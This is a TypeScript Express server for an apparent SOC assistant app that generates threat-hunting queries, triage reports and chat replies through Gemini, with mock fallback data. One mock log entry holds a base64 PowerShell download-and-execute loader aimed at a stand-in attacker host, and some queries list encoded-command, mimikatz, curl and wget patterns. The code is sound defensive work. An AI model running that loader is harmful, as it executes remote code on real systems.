import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import { GoogleGenAI } from '@google/genai';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(express.json());

const PORT = 3000;

// Lazy initialization of Gemini client
let aiClient: GoogleGenAI | null = null;
function getGeminiClient(): GoogleGenAI | null {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
    return null;
  }
  if (!aiClient) {
    aiClient = new GoogleGenAI({ apiKey });
  }
  return aiClient;
}

// 1. API: Threat Hunting Generator
app.post('/api/hunt', async (req, res) => {
  const { intent, targetLogs, queryLanguage } = req.body;

  if (!intent) {
    return res.status(400).json({ error: 'Intent is required' });
  }

  const ai = getGeminiClient();

  if (!ai) {
    // Elegant offline simulation fallback if API key is not provided
    const mockQuery = generateFallbackQuery(intent, queryLanguage);
    return res.json({
      ...mockQuery,
      warning: 'Using intelligent simulation. To enable real-time Gemini Threat Hunting, add your GEMINI_API_KEY in Settings > Secrets.'
    });
  }

  try {
    const prompt = `You are a Principal SOC Analyst and Security Engineer. Generate a production-ready threat hunting query based on the following:
Investigation Intent: "${intent}"
Primary Logs: "${targetLogs || 'Auto-detect'}"
Target Query Language: "${queryLanguage}"

Return a JSON object exactly matching this structure (no markdown fences, just pure JSON):
{
  "generatedQuery": "THE_COMMAND_OR_QUERY_STRING",
  "explanation": "Brief explanation of how this query finds the threat and security analysis of the scenario",
  "suggestedDataSources": ["source_1", "source_2"],
  "simulatedResultsCount": 5,
  "simulatedResultsJson": "[ {\\"timestamp\\": \\"2026-06-01T02:00:15Z\\", \\"src_ip\\": \\"10.0.0.12\\", \\"dest_ip\\": \\"185.220.101.5\\", \\"bytes_sent\\": 15420000, \\"details\\": \\"Suspicious volume to known Tor exit node\\"} ]"
}

Ensure the query and JSON values are properly escaped. Use realistic field names and syntax corresponding perfectly to ${queryLanguage}. For simulatedResultsJson, generate an array of 3-5 high-fidelity alert timeline log items revealing a suspicious security finding.`;

    const response = await ai.models.generateContent({
      model: 'gemini-3.5-flash',
      contents: prompt,
      config: {
        responseMimeType: 'application/json',
      }
    });

    const parsed = JSON.parse(response.text || '{}');
    return res.json(parsed);
  } catch (err: any) {
    console.error('Gemini threat hunt generation failed:', err);
    return res.status(500).json({
      error: 'Failed to generate threat hunt',
      details: err.message,
      fallback: generateFallbackQuery(intent, queryLanguage)
    });
  }
});

// 2. API: Incident Triage Analyzer
app.post('/api/triage', async (req, res) => {
  const { alert } = req.body;

  if (!alert) {
    return res.status(400).json({ error: 'Alert data is required' });
  }

  const ai = getGeminiClient();

  if (!ai) {
    // Offline simulation fallback
    const mockTriage = generateFallbackTriage(alert);
    return res.json({
      ...mockTriage,
      warning: 'Using expert system fallback. Set GEMINI_API_KEY for deep AI cognitive triage.'
    });
  }

  try {
    const prompt = `You are an automated tier-3 SOC AI triage bot. Analyze this cyber security alert:
Title: "${alert.title}"
Severity: "${alert.severity}"
Source: "${alert.source}"
Description: "${alert.description}"
Entities involved: ${JSON.stringify(alert.entities || [])}

Perform deep triage. Assess indicators of compromise, compromise context, and visual attack propagation route.
Return a JSON object matching this structure EXACTLY (no markdown wrappers, pure JSON):
{
  "riskScore": 85, // (0 to 100 risk integer)
  "explanation": "Cohesive summary analyzing the attack vectors, malicious behaviors, or false-positive indicator checks",
  "compromisingFactors": [
    "Identified credential dumping command line parameters",
    "Source IP correlates to high-risk VPS subnet"
  ],
  "recommendedAction": "Isolate Endpoint immediately, quarantine process tree, and revoke active SAML sessions for the user.",
  "visualAttackPath": [
    "Initial Access: Phishing Link clicked",
    "Execution: Office Macro PowerShell script run",
    "Credential Access: Mimikatz loaded to memory"
  ],
  "timeline": [
    {
      "time": "02:40:12",
      "source": "Windows Event Log",
      "activity": "Process creation cmd.exe",
      "details": "Parent process explorer.exe spawned cmd.exe running base64 encoded PowerShell"
    }
  ]
}

Make sure the risk score, timeline coordinates, and visual attack path reflect logical incident-response progressions. Use professional cybersecurity language.`;

    const response = await ai.models.generateContent({
      model: 'gemini-3.5-flash',
      contents: prompt,
      config: {
        responseMimeType: 'application/json',
      }
    });

    const parsed = JSON.parse(response.text || '{}');
    return res.json(parsed);
  } catch (err: any) {
    console.error('Gemini incident triage failed:', err);
    return res.status(500).json({
      error: 'Failed to triage incident',
      details: err.message,
      fallback: generateFallbackTriage(alert)
    });
  }
});

// 3. API: SOC Co-Pilot Chat
app.post('/api/chat', async (req, res) => {
  const { messages, context } = req.body;

  if (!messages || !Array.isArray(messages)) {
    return res.status(400).json({ error: 'Messages history is required' });
  }

  const ai = getGeminiClient();

  if (!ai) {
    // Generate intelligent assistant response offline
    const lastUserMessage = messages[messages.length - 1]?.text || 'Hello';
    const mockRep = generateFallbackChat(lastUserMessage, context);
    return res.json({
      response: mockRep,
      warning: 'Co-Pilot operating in simulation mode. Attach GEMINI_API_KEY to enable full cognitive agent execution.'
    });
  }

  try {
    const formattedHistory = messages.map(msg => ({
      role: msg.sender === 'user' ? 'user' : 'model',
      parts: [{ text: msg.text }]
    }));

    // Insert system directive at the beginning
    const contextPrompt = context 
      ? `Active Context in SOC Portal:\n${JSON.stringify(context)}\n\n`
      : '';

    const systemPrompt = `You are an elite SOC Chatbot Agent / Co-Pilot running inside a modern incident response web platform.
You assist the security analyst in threat hunting, searching logs, building KQL/SPL queries, investigating processes, and choosing remediation playbooks.

Active Platform State Context:
${contextPrompt}

Respond briefly, professionally, and logically. Avoid fluffy intros. Provide clear commands or query snippets if relevant. Mark query codeblocks with standard markdown. Keep your answer actionable and calm.`;

    // Feed to Gemini call
    const contentsObj = [
      { role: 'user', parts: [{ text: systemPrompt }] },
      ...formattedHistory
    ];

    const response = await ai.models.generateContent({
      model: 'gemini-3.5-flash',
      contents: contentsObj,
    });

    return res.json({ response: response.text });
  } catch (err: any) {
    console.error('Gemini chat co-pilot failed:', err);
    return res.status(500).json({
      error: 'Failed to query Agent Co-Pilot',
      details: err.message,
      response: "Standard Network Failover: Co-Pilot was unable to query deep neural layers. Please check your internet connectivity or key permissions."
    });
  }
});

// --- OFFLINE/SIMULATED FALLBACK GENERATORS ---

function generateFallbackQuery(intent: string, language: string) {
  const normalized = intent.toLowerCase();
  let query = '';
  let explanation = '';
  let dataSources: string[] = [];
  let simulatedResults: any[] = [];

  if (normalized.includes('ssh') || normalized.includes('brute') || normalized.includes('login')) {
    dataSources = ['auth.log', 'Syslog', 'Windows Event ID 4625'];
    if (language === 'Splunk SPL') {
      query = `sourcetype="linux_secure" (action="failed" OR action="failure") status="failed" \n| stats count by src_ip, user \n| filter count > 10 \n| sort -count`;
      explanation = 'Aggregates secure logs filtering by failed validation actions, grouped by the source IP and user, pointing immediately to SSH brute-force patterns.';
    } else if (language === 'KQL (Sentinel)') {
      query = `SigninLogs\n| where ResultType == "50126" // Claims validation failed\n| summarize FailureCount = count() by IPAddress, UserPrincipalName\n| where FailureCount > 15\n| sort by FailureCount desc`;
      explanation = 'Queries Entra login audits targeting standard failure return status codes. Groups source traffic coordinates to pinpoint systemic credentials spray vectors.';
    } else {
      query = `SELECT src_ip, count(*) as failed_attempts \nFROM auth_logs \nWHERE action='login_failed' \nGROUP BY src_ip \nHAVING failed_attempts > 20 \nORDER BY failed_attempts DESC`;
      explanation = 'Queries relational auth logging database tracking cumulative failed login entries exceeding high-volume threat flags.';
    }
    simulatedResults = [
      { timestamp: '2026-06-01T02:15:00Z', src_ip: '194.5.249.12', user: 'root', failed_attempts: 142, details: 'Targeting port 22 continuous root spray' },
      { timestamp: '2026-06-01T02:18:24Z', src_ip: '194.5.249.12', user: 'admin', failed_attempts: 98, details: 'Targeting admin credential pool' },
      { timestamp: '2026-06-01T02:22:11Z', src_ip: '185.190.140.54', user: 'ubuntu', failed_attempts: 34, details: 'AWS EC2 public entry sweep' }
    ];
  } else if (normalized.includes('file') || normalized.includes('exfiltration') || normalized.includes('traffic') || normalized.includes('s3')) {
    dataSources = ['Firewall Logs', 'NetFlow records', 'Cloudaudit S3 Log'];
    if (language === 'Splunk SPL') {
      query = `sourcetype="aws:cloudtrail" eventName=PutBucketPolicy OR eventName=DeleteBucketPolicy\n| stats values(userIdentity.arn) by src_ip, requestParameters.bucketName`;
      explanation = 'Monitors AWS CloudTrail payload actions tracking unauthorized public alterations to S3 data lakes.';
    } else if (language === 'KQL (Sentinel)') {
      query = `CommonSecurityLog\n| where SentBytes > 1000000000 // Exceeding 1GB transfer\n| summarize TotalData = sum(SentBytes) by SourceIP, DestinationIP, DestinationPort\n| sort by TotalData desc`;
      explanation = 'Queries firewalls capturing session lengths with transfer quantities revealing mass point-to-point datalake exfiltration.';
    } else {
      query = `SELECT source_ip, dest_ip, sum(bytes_sent) as volume_gb \nFROM firewall_traffic \nWHERE dest_country != 'US' \nGROUP BY source_ip, dest_ip \nHAVING volume_gb > 10 \nORDER BY volume_gb DESC`;
      explanation = 'Sifts local interface logging, capturing egress transfers leaving national boundaries exceeding standard thresholds.';
    }
    simulatedResults = [
      { timestamp: '2026-06-01T01:45:00Z', src_ip: '10.100.4.52', dest_ip: '93.115.24.11', volume_gb: 42.1, details: 'Egress connection uploading to dynamic remote IP' },
      { timestamp: '2026-06-01T02:02:15Z', src_ip: '10.100.4.88', dest_ip: '141.101.121.6', volume_gb: 12.8, details: 'Continuous file synchronization transfer' }
    ];
  } else {
    dataSources = ['Process Audit log', 'Syslog', 'Microsoft Security Events'];
    if (language === 'Splunk SPL') {
      query = `sourcetype="WinEventLog:Security" EventCode=4688 \n| search Process_Name="powershell.exe" OR Process_Name="cmd.exe" NOT parent="explorer.exe" \n| table _time, ComputerName, New_Process_Name, CommandLine`;
      explanation = 'Scans Windows creation audits detecting suspicious parentage chains outside standard user explorer desktops.';
    } else if (language === 'KQL (Sentinel)') {
      query = `DeviceProcessEvents\n| where ProcessCommandLine has_any ("encodedcommand", "bypass", "downloadstring", "mimikatz")\n| project TimeGenerated, DeviceName, ActionType, ProcessCommandLine`;
      explanation = 'Monitors Microsoft Defender logs catching command flag configurations typical of remote execution or credential extraction scripts.';
    } else {
      query = `SELECT timestamp, host, process_name, command_line \nFROM system_processes \nWHERE command_line LIKE '%curl%' OR command_line LIKE '%wget%' \nORDER BY timestamp DESC`;
      explanation = 'Tracks bash terminal invocation logs identifying automated external script queries.';
    }
    simulatedResults = [
      { timestamp: '2026-06-01T02:30:10Z', host: 'PROD-APPSRV-01', process_name: 'powershell.exe', command_line: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAHQAeAB0ACcAKQA=', details: 'Base64 loader executing payload' }
    ];
  }

  return {
    generatedQuery: query,
    explanation,
    suggestedDataSources: dataSources,
    simulatedResultsCount: simulatedResults.length,
    simulatedResultsJson: JSON.stringify(simulatedResults, null, 2)
  };
}

function generateFallbackTriage(alert: any) {
  let riskScore = 45;
  let compromisingFactors: string[] = [];
  let recommendedAction = '';
  let visualAttackPath: string[] = [];
  let timeline: any[] = [];
  let explanation = '';

  const titleLower = alert.title.toLowerCase();

  if (titleLower.includes('mimikatz') || titleLower.includes('credential') || titleLower.includes('domain controller')) {
    riskScore = 95;
    explanation = `Critical compromise detected. Local Security Authority Subsystem Service (LSASS) read credentials from memory using Mimikatz utilities on a highly privileged Domain Controller. This pattern confirms full credential extraction capabilities on prime infrastructure, paving the path to active Windows Golden Ticket escalation.`;
    compromisingFactors = [
      'Successful read handles targeted at security processes (lsass.exe)',
      'Highly sensitive machine context (Domain Controller)',
      'Command matching credential-extraction patterns'
    ];
    recommendedAction = 'Deploy network containment on DC-01 immediately. Terminate active credentials for exposed domain-administrator tokens. Pivot to Active Directory audit and enforce immediate Kerberos service account (krbtgt) password resets.';
    visualAttackPath = [
      'Initial compromise of Domain Admin account via spearphishing',
      'Lateral movement to DC-01 using compromised Remote Desktop (RDP) sessions',
      'Memory dumping on DC-01 matching Mimikatz signatures'
    ];
    timeline = [
      { time: '02:10:15', source: 'Windows Defender ATP', activity: 'LSASS process memory access detected', details: 'Unauthorized process requested read permissions to standard lsass descriptor handles' },
      { time: '02:10:30', source: 'Active Directory Admin Audit', activity: 'New privileged group member registered', details: 'User account "jsmith_admin" registered to primary Enterprise Admins domain tables' }
    ];
  } else if (titleLower.includes('brute') || titleLower.includes('ssh') || titleLower.includes('login')) {
    riskScore = 70;
    explanation = 'Successful high-volume authentication failures followed immediately by a single successful logon event. Suggests active credential-stuffing or password-spraying campaigns originating from persistent external proxy node configurations.';
    compromisingFactors = [
      'Failed login threshold breached (over 180 attempts/min)',
      'Attacking IP coordinates mapped to high-risk exit points (VPN/Tor)',
      'Target user represents key administrator'
    ];
    recommendedAction = 'Mandate multi-factor security verification challenge. Revoke active authorization tokens for victim accounts. Create persistent CIDR blocking rules in top perimeter firewalls for attacking remote nodes.';
    visualAttackPath = [
      'High-volume password spray sweeps public network boundaries',
      'Breach of single administrator endpoint password verification',
      'Successful authentication to internal JumpBox environment'
    ];
    timeline = [
      { time: '01:55:00', source: 'Firewall Audit logs', activity: 'Breach of baseline access rate thresholds', details: 'Attacking host established 45 concurrent socket endpoints directed sequentially at terminal services' },
      { time: '02:00:12', source: 'PAM Gateways', activity: 'Successful authentication registry', details: 'Account "sysadmin" validated credential validation flags from attacker IP standard location' }
    ];
  } else {
    riskScore = 35;
    explanation = `Moderate anomaly flagged. A non-standard application launched shell utilities from within temporary staging structures. The telemetry suggests regular background task updates or minor administrative automation scripting matching regular operational intervals.`;
    compromisingFactors = [
      'Execution of shell processes inside application containers',
      'Origin matches dynamic development clusters'
    ];
    recommendedAction = 'Review development pipeline automation registries. Reach out to application owners to confirm current CI/CD integration schedules, and mark the process as an verified administrative script.';
    visualAttackPath = [
      'DevOps automation workflow triggers microservice container updates',
      'Automated staging file utility updates trigger shell parameters'
    ];
    timeline = [
      { time: '02:30:10', source: 'Docker Container Runtime', activity: 'Shell wrapper instance creation', details: 'Verified deployment container invoked binary execution to stage config updates' }
    ];
  }

  return {
    riskScore,
    explanation,
    compromisingFactors,
    recommendedAction,
    visualAttackPath,
    timeline
  };
}

function generateFallbackChat(message: string, context: any) {
  const normalized = message.toLowerCase();
  if (normalized.includes('playbook') || normalized.includes('remediat')) {
    return `To handle incidents automatedly, select a pre-configured playbook from the **Playbook Orchestrator** tab. 

I can automate remediation sequences containing these events:
1. **Network Containment**: Isolates endpoints immediately using virtual firewall policies.
2. **IP Access Ban**: Commits global perimeter blocks against offending threat vectors.
3. **Session Revocation**: Flags active IAM credentials for immediate enterprise reset.

Which system context would you like me to map this playbook configuration to?`;
  }
  if (normalized.includes('hunt') || normalized.includes('search') || normalized.includes('query')) {
    return `I can help you build custom telemetry queries. Go to the **Threat Hunting Console** tab to target logs using Splunk SPL, Microsoft KQL, or Elastic Security formats.

For instance, you can request:
- *"Search for large traffic egress outliers"*
- *"Find failed password sprays against root accounts"*

Which query framework does your current SIEM operate on?`;
  }
  return `SOC Agent online. I am monitoring active alarms, staging real-time threat hunts, and keeping playbook automation pipelines ready. 

Here are some commands you can ask me to run in this terminal environment:
- **"Generate search query for SSH logins pattern"** to draft custom threat hunters.
- **"Analyze incident alert to identify indicators of compromise"** to perform automated triaging.
- **"Explain mitigation playbooks for ransomware containment"** to orchestrate workflows.

How can I support your operations today?`;
}


// Start Server Function
async function startServer() {
  // Vite integration for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    // Production serving static files
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[SOC AI Agent] Server running on http://localhost:${PORT}`);
  });
}

startServer();
